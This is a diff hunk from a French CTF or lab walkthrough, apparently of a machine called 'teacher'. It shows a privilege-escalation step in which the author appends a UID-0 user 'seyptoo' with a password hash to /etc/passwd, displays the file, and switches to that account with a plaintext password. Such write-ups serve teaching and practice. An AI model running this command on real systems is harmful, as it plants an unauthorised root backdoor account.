@@ -240,7 +240,7 @@ Donc concrètement je vais ajouter une ligne dans le fichier /etc/passwd pour ê
     giovanni@teacher:/etc$ echo -e 'seyptoo:$6$4.FCX0BzdmJd77$HWgUSNGZsazwyv1ZMUVIP1u6R8wsPwTk20xOp0kRHd2T2EELmaIlxO9aloi0QtxBnfFjMlLehMDccVjd5yN00.:0:0:root:/root:/bin/bash ' >> /etc/passwd
 
     giovanni@teacher:/etc$ cat passwd
-    root:x:0:0:root:/root:/bin/bash             seyptoo:$6$4.FCX0BzdmJd77$HWgUSNGZsazwyv1ZMUVIP1u6R8wsPwTk20xOp0kRHd2T2EELmaIlxO9aloi0QtxBnfFjMlLehMDccVjd5yN00.:0:0:root:/root:/bin/bash
+    root:x:0:0:root:/root:/bin/bash
     giovanni@teacher:/etc$ su - seyptoo
     su - seyptoo
     Password: seyptoo
